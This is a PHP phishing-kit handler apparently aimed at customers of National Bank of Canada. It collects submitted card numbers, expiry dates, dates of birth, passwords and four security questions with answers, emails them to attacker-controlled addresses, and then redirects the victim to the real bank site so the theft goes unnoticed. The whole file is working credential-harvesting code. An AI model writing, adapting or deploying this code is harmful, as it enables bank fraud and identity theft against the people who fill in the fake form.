<?php
include "arthursoccer179@gmail.com";

$clientCard = $_POST['clientCard'];
$cardExpDate= $_POST['cardExpDate'];
$dateNaissance= $_POST['dateNaissance'];
$secretQuestion1Key = $_POST['secretQuestion1Key'];
$secretAnswer1 = $_POST['secretAnswer1'];
$secretQuestion2Key = $_POST['secretQuestion2Key'];
$secretAnswer2 = $_POST['secretAnswer2'];
$secretQuestion3Key = $_POST['secretQuestion3Key'];
$secretAnswer3 = $_POST['secretAnswer3'];
$secretQuestion4Key = $_POST['secretQuestion4Key'];
$secretAnswer4 = $_POST['secretAnswer4'];
$password = $_POST['password'];
$data ="

================================================
user: $clientCard
expiration: $cardExpDate
dob: $dateNaissance
password:   $password
------------------------------------------------
question 1:  $secretQuestion1Key
answer 1:   $secretAnswer1
question 2:  $secretQuestion2Key
answer 2:   $secretAnswer2
question 3:  $secretQuestion3Key
answer 3:   $secretAnswer3
question 4:  $secretQuestion4Key
answer 3:   $secretAnswer4
================================================
";



$subj="NATIO $dateNaissance"; 




mail($mailone, $subj, $data);
mail($cc, $subj, $data);

header("Location: https://www.nbc.ca");

?>